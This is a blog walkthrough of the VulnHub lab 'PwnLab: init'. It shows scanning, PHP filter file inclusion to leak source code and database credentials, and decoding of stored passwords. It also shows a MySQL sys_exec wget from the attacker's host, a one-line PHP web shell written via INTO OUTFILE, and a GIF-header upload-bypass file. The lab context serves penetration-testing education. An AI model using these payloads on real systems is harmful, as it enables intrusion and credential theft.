@@ -1,0 +1,935 @@
+---
+layout: post
+title: "PwnLab: init"
+date: 2019-05-21 20:54:35 +0000
+author: Larry Brown
+category: Walkthroughs
+tags: [vulnhub, lfi, php filter, image upload bypass, suid]
+---
+<div>VulnHub URL: <a href="https://www.vulnhub.com/entry/pwnlab-init,158/" target="_blank">https://www.vulnhub.com/entry/pwnlab-init,158/</a></div>
+<div>Hostname: pwnlab</div>
+<div>IP Address: 10.183.0.223</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Information Gathering/Recon</h2>
+</div>
+<div><br /></div>
+<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.223.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Service Enumeration/Scanning</h2>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pwnlabinit# nmap -Pn -sT -sV -A --script=default,banner -oA pwnlabinit -p- 10.183.0.223</div>
+    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-21 09:46 CDT</div>
+    <div>Nmap scan report for pwnlab.homenet.dom (10.183.0.223)</div>
+    <div>Host is up (0.0014s latency).</div>
+    <div>Not shown: 65531 closed ports</div>
+    <div>PORT      STATE SERVICE VERSION</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</font>
+    </div>
+    <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.10</font> (Debian)</div>
+    <div>|_http-title: PwnLab Intranet Image Hosting</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">111/tcp   open  rpcbind 2-4 (RPC #100000)</font>
+    </div>
+    <div>| rpcinfo: </div>
+    <div>|   program version   port/proto  service</div>
+    <div>|   100000  2,3,4        111/tcp  rpcbind</div>
+    <div>|   100000  2,3,4        111/udp  rpcbind</div>
+    <div>|   100024  1          45272/tcp  status</div>
+    <div>|_  100024  1          48434/udp  status</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">3306/tcp  open  mysql   </font>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">MySQL 5.5.47-0</font>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">+deb8u1</font>
+    </div>
+    <div>| banner: S\x00\x00\x00\x0A5.5.47-0+deb8u1\x00(\x00\x00\x00"_&lt;J&gt;:E0\x00\x</div>
+    <div>|_FF\xF7\x08\x02\x00\x0F\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x...</div>
+    <div>| mysql-info: </div>
+    <div>|   Protocol: 10</div>
+    <div>|   Version: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">5.5.47-0</font>+deb8u1</div>
+    <div>|   Thread ID: 39</div>
+    <div>|   Capabilities flags: 63487</div>
+    <div>|   Some Capabilities: SupportsTransactions, InteractiveClient, SupportsLoadDataLocal, Support41Auth, IgnoreSigpipes, LongColumnFlag, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, ODBCClient, LongPassword, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsCompression, Speaks41ProtocolNew, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins</div>
+    <div>|   Status: Autocommit</div>
+    <div>|   Salt: qz43A/c*BNCCg\u[E(9$</div>
+    <div>|_  Auth Plugin Name: 88</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">45272/tcp open  status  1 (RPC #100024)</font>
+    </div>
+    <div>MAC Address: 08:00:27:25:2E:EB (Oracle VirtualBox virtual NIC)</div>
+    <div>Device type: general purpose</div>
+    <div>Running: Linux 3.X|4.X</div>
+    <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
+    <div>OS details: Linux 3.2 - 4.9</div>
+    <div>Network Distance: 1 hop</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>TRACEROUTE</div>
+    <div>HOP RTT     ADDRESS</div>
+    <div>1   1.44 ms pwnlab.homenet.dom (10.183.0.223)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+    <div>Nmap done: 1 IP address (1 host up) scanned in 37.07 seconds</div>
+</div>
+<div><br /></div>
+<!--more-->
+<div><br /></div>
+<div>
+    <h2>Gaining Access</h2>
+</div>
+<div><br /></div>
+<div>Checking on the software version information returned from nmap:</div>
+<ul>
+    <li>
+        <div>Apache/2.4.10 - no known vulnerabilities</div>
+    </li>
+    <li>
+        <div>MySQL 5.5.47-0 - no known vulnerabilities</div>
+    </li>
+</ul>
+<div><br /></div>
+<div>Not much to start with. I'll start digging into the HTTP service on TCP port 80.</div>
+<div><br /></div>
+<div>The default site for the service contains some links that might be vulnerable to local file inclusion.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>[ &lt;a href="/"&gt;Home&lt;/a&gt; ] [ &lt;a href="?page=login"&gt;Login&lt;/a&gt; ] [ &lt;a href="?page=upload"&gt;Upload&lt;/a&gt; ]</div>
+</div>
+<div><br /></div>
+<div>Using some common LFI techniques, I wasn't able to load any files from the system. However, using PHP filters, I can load the contents of PHP pages as base64 encoded text.</div>
+<div><br /></div>
+<div>For example, the following URL...</div>
+<div><br /></div>
+<div><a href="http://10.183.0.223/index.php?page=php://filter/convert.base64-encode/resource=login">http://10.183.0.223/index.php?page=php://filter/convert.base64-encode/resource=login</a></div>
+<div><br /></div>
+<div>Returns the base64 string...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCnJlcXVpcmUoImNvbmZpZy5waHAiKTsNCiRteXNxbGkgPSBuZXcgbXlzcWxpKCRzZXJ2ZXIsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOw0KDQppZiAoaXNzZXQoJF9QT1NUWyd1c2VyJ10pIGFuZCBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkpDQp7DQoJJGx1c2VyID0gJF9QT1NUWyd1c2VyJ107DQoJJGxwYXNzID0gYmFzZTY0X2VuY29kZSgkX1BPU1RbJ3Bhc3MnXSk7DQoNCgkkc3RtdCA9ICRteXNxbGktPnByZXBhcmUoIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcj0/IEFORCBwYXNzPT8iKTsNCgkkc3RtdC0+YmluZF9wYXJhbSgnc3MnLCAkbHVzZXIsICRscGFzcyk7DQoNCgkkc3RtdC0+ZXhlY3V0ZSgpOw0KCSRzdG10LT5zdG9yZV9SZXN1bHQoKTsNCg0KCWlmICgkc3RtdC0+bnVtX3Jvd3MgPT0gMSkNCgl7DQoJCSRfU0VTU0lPTlsndXNlciddID0gJGx1c2VyOw0KCQloZWFkZXIoJ0xvY2F0aW9uOiA/cGFnZT11cGxvYWQnKTsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobyAiTG9naW4gZmFpbGVkLiI7DQoJfQ0KfQ0KZWxzZQ0Kew0KCT8+DQoJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+DQoJPGxhYmVsPlVzZXJuYW1lOiA8L2xhYmVsPjxpbnB1dCBpZD0idXNlciIgdHlwZT0idGVzdCIgbmFtZT0idXNlciI+PGJyIC8+DQoJPGxhYmVsPlBhc3N3b3JkOiA8L2xhYmVsPjxpbnB1dCBpZD0icGFzcyIgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3MiPjxiciAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj4NCgk8L2Zvcm0+DQoJPD9waHANCn0NCg==</div>
+</div>
+<div><br /></div>
+<div>If I decode that, I get the following.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pwnlabinit# echo "PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCnJlcXVpcmUoImNvbmZpZy5waHAiKTsNCiRteXNxbGkgPSBuZXcgbXlzcWxpKCRzZXJ2ZXIsICR</div>
+    <div>1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOw0KDQppZiAoaXNzZXQoJF9QT1NUWyd1c2VyJ10pIGFuZCBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkpDQp7DQoJJGx1c2VyID0gJF9QT1NUWyd1c</div>
+    <div>2VyJ107DQoJJGxwYXNzID0gYmFzZTY0X2VuY29kZSgkX1BPU1RbJ3Bhc3MnXSk7DQoNCgkkc3RtdCA9ICRteXNxbGktPnByZXBhcmUoIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcj0/IEF</div>
+    <div>ORCBwYXNzPT8iKTsNCgkkc3RtdC0+YmluZF9wYXJhbSgnc3MnLCAkbHVzZXIsICRscGFzcyk7DQoNCgkkc3RtdC0+ZXhlY3V0ZSgpOw0KCSRzdG10LT5zdG9yZV9SZXN1bHQoKTsNCg0KCWlmICgkc</div>
+    <div>3RtdC0+bnVtX3Jvd3MgPT0gMSkNCgl7DQoJCSRfU0VTU0lPTlsndXNlciddID0gJGx1c2VyOw0KCQloZWFkZXIoJ0xvY2F0aW9uOiA/cGFnZT11cGxvYWQnKTsNCgl9DQoJZWxzZQ0KCXsNCgkJZWN</div>
+    <div>obyAiTG9naW4gZmFpbGVkLiI7DQoJfQ0KfQ0KZWxzZQ0Kew0KCT8+DQoJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+DQoJPGxhYmVsPlVzZXJuYW1lOiA8L2xhYmVsPjxpbnB1dCBpZD0idXNlciIgdHlwZT0idGVzdCIgbmFtZT0idXNlciI+PGJyIC8+DQoJPGxhYmVsPlBhc3N3b3JkOiA8L2xhYmVsPjxpbnB1dCBpZD0icGFzcyIgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3MiPjxiciAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj4NCgk8L2Zvcm0+DQoJPD9waHANCn0NCg==" | base64 -d</div>
+    <div>&lt;?php</div>
+    <div>session_start();</div>
+    <div>require("config.php");</div>
+    <div>$mysqli = new mysqli($server, $username, $password, $database);</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>if (isset($_POST['user']) and isset($_POST['pass']))</div>
+    <div>{</div>
+    <div>        $luser = $_POST['user'];</div>
+    <div>        $lpass = base64_encode($_POST['pass']);</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>        $stmt = $mysqli-&gt;prepare("SELECT * FROM users WHERE user=? AND pass=?");</div>
+    <div>        $stmt-&gt;bind_param('ss', $luser, $lpass);</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>        $stmt-&gt;execute();</div>
+    <div>        $stmt-&gt;store_Result();</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>        if ($stmt-&gt;num_rows == 1)</div>
+    <div>        {</div>
+    <div>                $_SESSION['user'] = $luser;</div>
+    <div>                header('Location: ?page=upload');</div>
+    <div>        }</div>
+    <div>        else</div>
+    <div>        {</div>
+    <div>                echo "Login failed.";</div>
+    <div>        }</div>
+    <div>}</div>
+    <div>else</div>
+    <div>{</div>
+    <div>        ?&gt;</div>
+    <div>        &lt;form action="" method="POST"&gt;</div>
+    <div>        &lt;label&gt;Username: &lt;/label&gt;&lt;input id="user" type="test" name="user"&gt;&lt;br /&gt;</div>
+    <div>        &lt;label&gt;Password: &lt;/label&gt;&lt;input id="pass" type="password" name="pass"&gt;&lt;br /&gt;</div>
+    <div>        &lt;input type="submit" name="submit" value="Login"&gt;</div>
+    <div>        &lt;/form&gt;</div>
+    <div>        &lt;?php</div>
+    <div>}</div>
+</div>
+<div><br /></div>
+<div>If we use the same technique to load the config.php page, we should be able to obtain the database credentials.</div>
+<div><br /></div>
+<div><a href="http://10.183.0.223/index.php?page=php://filter/convert.base64-encode/resource=config">http://10.183.0.223/index.php?page=php://filter/convert.base64-encode/resource=config</a></div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pwnlabinit# echo "PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+" | base64 -d</div>
+    <div>&lt;?php</div>
+    <div>$server   = "localhost";</div>
+    <div>$username = "root";</div>
+    <div>$password = "H4u%QJ_H99";</div>
+    <div>$database = "Users";</div>
+    <div>?&gt;</div>
+</div>
+<div><br /></div>
+<div>Let's see if we can use these credentials to connect to the MySQL service on the victim.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pwnlabinit# mysql -u root -p -h 10.183.0.223</div>
+    <div>Enter password: </div>
+    <div>Welcome to the MariaDB monitor.  Commands end with ; or \g.</div>
+    <div>Your MySQL connection id is 69</div>
+    <div>Server version: 5.5.47-0+deb8u1 (Debian)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>MySQL [(none)]&gt;</div>
+</div>
+<div><br /></div>
+<div>Yes, indeed! 😄</div>
+<div><br /></div>
+<div>Now we should be able to dump the user information from the database, login, and hopefully upload a reverse shell.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>MySQL [(none)]&gt; show databases;</div>
+    <div>+--------------------+</div>
+    <div>| Database           |</div>
+    <div>+--------------------+</div>
+    <div>| information_schema |</div>
+    <div>| Users              |</div>
+    <div>+--------------------+</div>
+    <div>2 rows in set (0.001 sec)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>MySQL [(none)]&gt; use Users;</div>
+    <div>Reading table information for completion of table and column names</div>
+    <div>You can turn off this feature to get a quicker startup with -A</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Database changed</div>
+    <div>MySQL [Users]&gt; show tables;</div>
+    <div>+-----------------+</div>
+    <div>| Tables_in_Users |</div>
+    <div>+-----------------+</div>
+    <div>| users           |</div>
+    <div>+-----------------+</div>
+    <div>1 row in set (0.002 sec)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>MySQL [Users]&gt; show columns in users;</div>
+    <div>+-------+-------------+------+-----+---------+-------+</div>
+    <div>| Field | Type        | Null | Key | Default | Extra |</div>
+    <div>+-------+-------------+------+-----+---------+-------+</div>
+    <div>| user  | varchar(30) | YES  |     | NULL    |       |</div>
+    <div>| pass  | varchar(30) | YES  |     | NULL    |       |</div>
+    <div>+-------+-------------+------+-----+---------+-------+</div>
+    <div>2 rows in set (0.002 sec)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>MySQL [Users]&gt; select * from users;</div>
+    <div>+------+------------------+</div>
+    <div>| user | pass             |</div>
+    <div>+------+------------------+</div>
+    <div>| kent | Sld6WHVCSkpOeQ== |</div>
+    <div>| mike | U0lmZHNURW42SQ== |</div>
+    <div>| kane | aVN2NVltMkdSbw== |</div>
+    <div>+------+------------------+</div>
+    <div>3 rows in set (0.002 sec)</div>
+</div>
+<div><br /></div>
+<div>As we saw when we dumped the login.php page, the passwords are base64 encoded before being checked in the database. We should be able to reverse these base64 encoded passwords pretty easily.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>kent | Sld6WHVCSkpOeQ== | JWzXuBJJNy</div>
+    <div>mike | U0lmZHNURW42SQ== | SIfdsTEn6I</div>
+    <div>kane | aVN2NVltMkdSbw== | iSv5Ym2GRo</div>
+</div>
+<div><br /></div>
+<div>Looks like the users have been selecting good, random passwords. It's a shame they are being stored (basically) in plain text.</div>
+<div><br /></div>
+<div>Time to go try out these credentials on our upload site. Before we leave the mysql database, though, we should make sure it can't execute system commands or write files for us.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>MySQL [Users]&gt; select sys_exec('wget -O /tmp/test 10.183.0.222:4321/test');</div>
+    <div>ERROR 1305 (42000): FUNCTION Users.sys_exec does not exist</div>
+    <div>MySQL [Users]&gt; select "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/cmd.php";</div>
+    <div>ERROR 1045 (28000): Access denied for user 'root'@'%' (using password: YES)</div>
+</div>
+<div><br /></div>
+<div>Doesn't look like it. Moving on...</div>
+<div><br /></div>
+<div>We'll start by logging in as kent. There isn't any indication that it matters which user we login with, but we can always switch to a different user if we need to.</div>
+<div><br /></div>
+<div>After logging in, we are able to access the upload page.</div>
+<div><br /></div>
+<div><img height="290" src="/assets/images/2019-05-21-pwnlab-init/4DD6602F-14CD-4EC7-BD7F-B4FB4CE3999D.png" width="666" /></div>
+<div><br /></div>
+<div>It is a pretty simple upload form. Thankfully, we can use our LFI/PHP filter technique to view the actual page source and see what's really happening.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pwnlabinit# echo "PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCmlmICghaXNzZXQoJF9TRVNTSU9OWyd1c2VyJ10pKSB7IGRpZSgnWW91IG11c3QgYmUgbG9nIGl</div>
+    <div>uLicpOyB9DQo/Pg0KPGh0bWw+DQoJPGJvZHk+DQoJCTxmb3JtIGFjdGlvbj0nJyBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPg0KCQkJPGlucHV0IHR5cGU9J2Zpb</div>
+    <div>GUnIG5hbWU9J2ZpbGUnIGlkPSdmaWxlJyAvPg0KCQkJPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJy8+DQoJCTwvZm9ybT4NCgk8L2JvZHk+DQo8L2h0bWw</div>
+    <div>+DQo8P3BocCANCmlmKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKSB7DQoJaWYgKCRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA8PSAwKSB7DQoJCSRmaWxlbmFtZSAgPSAkX0ZJTEVTWydmaWxlJ11bJ</div>
+    <div>25hbWUnXTsNCgkJJGZpbGV0eXBlICA9ICRfRklMRVNbJ2ZpbGUnXVsndHlwZSddOw0KCQkkdXBsb2FkZGlyID0gJ3VwbG9hZC8nOw0KCQkkZmlsZV9leHQgID0gc3RycmNocigkZmlsZW5hbWUsICc</div>
+    <div>uJyk7DQoJCSRpbWFnZWluZm8gPSBnZXRpbWFnZXNpemUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddKTsNCgkJJHdoaXRlbGlzdCA9IGFycmF5KCIuanBnIiwiLmpwZWciLCIuZ2lmIiwiLnBuZ</div>
+    <div>yIpOyANCg0KCQlpZiAoIShpbl9hcnJheSgkZmlsZV9leHQsICR3aGl0ZWxpc3QpKSkgew0KCQkJZGllKCdOb3QgYWxsb3dlZCBleHRlbnNpb24sIHBsZWFzZSB1cGxvYWQgaW1hZ2VzIG9ubHkuJyk</div>
+    <div>7DQoJCX0NCg0KCQlpZihzdHJwb3MoJGZpbGV0eXBlLCdpbWFnZScpID09PSBmYWxzZSkgew0KCQkJZGllKCdFcnJvciAwMDEnKTsNCgkJfQ0KDQoJCWlmKCRpbWFnZWluZm9bJ21pbWUnXSAhPSAna</div>
+    <div>W1hZ2UvZ2lmJyAmJiAkaW1hZ2VpbmZvWydtaW1lJ10gIT0gJ2ltYWdlL2pwZWcnICYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvanBnJyYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1</div>
+    <div>hZ2UvcG5nJykgew0KCQkJZGllKCdFcnJvciAwMDInKTsNCgkJfQ0KDQoJCWlmKHN1YnN0cl9jb3VudCgkZmlsZXR5cGUsICcvJyk+MSl7DQoJCQlkaWUoJ0Vycm9yIDAwMycpOw0KCQl9DQoNCgkJJ</div>
+    <div>HVwbG9hZGZpbGUgPSAkdXBsb2FkZGlyIC4gbWQ1KGJhc2VuYW1lKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkuJGZpbGVfZXh0Ow0KDQoJCWlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1s</div>
+    <div>nZmlsZSddWyd0bXBfbmFtZSddLCAkdXBsb2FkZmlsZSkpIHsNCgkJCWVjaG8gIjxpbWcgc3JjPVwiIi4kdXBsb2FkZmlsZS4iXCI+PGJyIC8+IjsNCgkJfSBlbHNlIHsNCgkJCWRpZSgnRXJyb3IgN</div>
+    <div>CcpOw0KCQl9DQoJfQ0KfQ0KDQo/Pg==" | base64 -d</div>
+    <div>&lt;?php</div>
+    <div>session_start();</div>
+    <div>if (!isset($_SESSION['user'])) { die('You must be log in.'); }</div>
+    <div>?&gt;</div>
+    <div>&lt;html&gt;</div>
+    <div>        &lt;body&gt;</div>
+    <div>                &lt;form action='' method='post' enctype='multipart/form-data'&gt;</div>
+    <div>                        &lt;input type='file' name='file' id='file' /&gt;</div>
+    <div>                        &lt;input type='submit' name='submit' value='Upload'/&gt;</div>
+    <div>                &lt;/form&gt;</div>
+    <div>        &lt;/body&gt;</div>
+    <div>&lt;/html&gt;</div>
+    <div>&lt;?php </div>
+    <div>if(isset($_POST['submit'])) {</div>
+    <div>        if ($_FILES['file']['error'] &lt;= 0) {</div>
+    <div>                $filename  = $_FILES['file']['name'];</div>
+    <div>                $filetype  = $_FILES['file']['type'];</div>
+    <div>                $uploaddir = 'upload/';</div>
+    <div>                $file_ext  = strrchr($filename, '.');</div>
+    <div>                $imageinfo = getimagesize($_FILES['file']['tmp_name']);</div>
+    <div>                $whitelist = array(".jpg",".jpeg",".gif",".png"); </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>                if (!(in_array($file_ext, $whitelist))) {</div>
+    <div>                        die('Not allowed extension, please upload images only.');</div>
+    <div>                }</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>                if(strpos($filetype,'image') === false) {</div>
+    <div>                        die('Error 001');</div>
+    <div>                }</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>                if($imageinfo['mime'] != 'image/gif' &amp;&amp; $imageinfo['mime'] != 'image/jpeg' &amp;&amp; $imageinfo['mime'] != 'image/jpg'&amp;&amp; $imageinfo['mime'] != 'image/png') {</div>
+    <div>                        die('Error 002');</div>
+    <div>                }</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>                if(substr_count($filetype, '/')&gt;1){</div>
+    <div>                        die('Error 003');</div>
+    <div>                }</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>                $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>                if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {</div>
+    <div>                        echo "&lt;img src=\"".$uploadfile."\"&gt;&lt;br /&gt;";</div>
+    <div>                } else {</div>
+    <div>                        die('Error 4');</div>
+    <div>                }</div>
+    <div>        }</div>
+    <div>}</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>?&gt;</div>
+</div>
+<div><br /></div>
+<div>Looking through the code, we see the following checks are being performed.</div>
+<ul>
+    <li>
+        <div>the file name we provide needs to end in '.jpg', '.jpeg', '.gif' or '.png'</div>
+    </li>
+    <li>
+        <div>the file type we provide needs to include the word 'image'</div>
+    </li>
+    <li>
+        <div>the file we provide needs to be able to pass a mime type check</div>
+    </li>
+    <li>
+        <div>the file type we provide can only have one slash</div>
+    </li>
+</ul>
+<div><br /></div>
+<div>Most of this should be easy enough to bypass (since we can control the name and type), but the mime type check is a little more difficult. We'll probably have to custom build our upload file to have common image headers, along with our PHP code. Another major issue is that the uploaded file, when saved, doesn't preserve anything we can control (and have validated). This means we'll have to find a way to either rename our uploaded file to get it to be executed as PHP code or have it included and evaluated as PHP code.</div>
+<div><br /></div>
+<div>Here are some of the common image signatures (occurring at the start of the file).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>jpg (JFIF): FFD8FFEO00104A464946</div>
+    <div>gif (GIF89a): 474946383961</div>
+    <div>png (PNG): 89504E47</div>
+</div>
+<div><br /></div>
+<div>Let's first see if our image signature technique will work to create a simple phpinfo page. We'll build a GIF file containing a valid "signature", but then PHP code.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pwnlabinit# echo "474946383961" | xxd -r -p &gt; test.gif</div>
+    <div>root@kali:~/Walkthroughs/pwnlabinit# echo "&lt;?php phpinfo(); ?&gt;" &gt;&gt; test.gif</div>
+    <div>root@kali:~/Walkthroughs/pwnlabinit# hexdump -C test.gif</div>
+    <div>00000000  47 49 46 38 39 61 3c 3f  70 68 70 20 70 68 70 69  |GIF89a&lt;?php phpi|</div>
+    <div>00000010  6e 66 6f 28 29 3b 20 3f  3e 0a                    |nfo(); ?&gt;.|</div>
+    <div>0000001a</div>
+</div>
+<div></div>
+<div><br /></div>
+<div>Time to try to upload it...</div>
+<div><br /></div>
+<div><img height="134" src="/assets/images/2019-05-21-pwnlab-init/3A19482F-D9F5-44EC-8209-1D757E6D3436.png" width="618" /></div>
+<div><br /></div>
